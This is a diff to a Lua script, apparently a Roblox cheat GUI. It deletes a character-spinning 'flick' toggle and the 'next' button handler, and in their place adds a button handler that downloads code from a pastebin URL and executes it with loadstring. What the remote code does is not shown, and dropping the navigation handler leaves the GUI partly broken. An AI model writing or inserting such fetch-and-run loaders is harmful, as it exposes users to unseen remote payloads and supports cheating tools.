@@ -259,38 +259,7 @@ lol0 = 5
 end
 end)
 
-button5.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    local char = player.Character or player.CharacterAdded:Wait()
-    local hrp = char:WaitForChild("HumanoidRootPart")
-
-    if lol69 == 1 then
-        lol69 = 2
-        button5.Text = "flick(on)"
-        task.spawn(function()
-            while lol69 == 2 do
-                local angle = math.sin(tick() * 5555555555555555) * math.rad(45) 
-                hrp.CFrame = CFrame.new(hrp.Position) * CFrame.Angles(0, angle, 0)
-                task.wait()
-            end
-        end)
-    else
-        lol69 = 1
-        button5.Text = "flick(off)"
-    end
-end)
-
-
-
-next.MouseButton1Click:Connect(function()
-	button.Visible = false
-	button1.Visible = false
-	button2.Visible = false
-  button3.Visible = true
-  button4.Visible = true
-  button5.Visible = true
-	next.Visible = false
-	back.Visible = true
+button5.MouseButton1Click:Connect(function() loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
 end)
 
 back.MouseButton1Click:Connect(function()
